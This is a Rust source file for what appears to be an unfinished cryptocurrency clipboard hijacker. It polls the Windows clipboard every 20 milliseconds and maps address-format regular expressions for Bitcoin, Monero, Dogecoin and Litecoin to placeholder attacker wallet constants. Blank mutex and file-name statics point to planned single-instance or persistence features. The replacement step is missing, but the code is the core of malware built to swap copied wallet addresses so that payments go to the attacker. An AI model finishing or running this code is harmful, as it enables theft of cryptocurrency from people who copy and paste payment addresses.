use clipboard::{ClipboardProvider, windows_clipboard::WindowsClipboardContext};
use std::{thread, time::Duration, collections::HashMap};

static MUTEX: &str = "";
static FILE_NAME: &str = "";

const BTC_ADDR: &str = "";
const XMR_ADDR: &str = "";
const DGE_ADDR: &str = "";
const LTC_ADDR: &str = "";

fn scan() -> Option<String> {
    let mut cb_prov = <WindowsClipboardContext as ClipboardProvider>::new().unwrap();

    match cb_prov.get_contents() {
        Ok(content) => return Some(String::from(content)),
        Err(..) => return None
    }
}

fn main() {
    let map: HashMap<&str, &str> = HashMap::from_iter([
        (r"^(1|3)[1-9A-HJ-NP-Za-km-z]{25,34}$|^bc1[a-zA-HJ-NP-Z0-9]{39,59}$", BTC_ADDR),
        (r"^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$", XMR_ADDR),
        (r"^D[1-9A-HJ-NP-Za-km-z]{33}$", DGE_ADDR),
        (r"^[LM3][1-9A-HJ-NP-Za-km-z]{26,33}$", LTC_ADDR)
    ]);

    loop {
        scan();

        thread::sleep(Duration::from_millis(20));
    }
}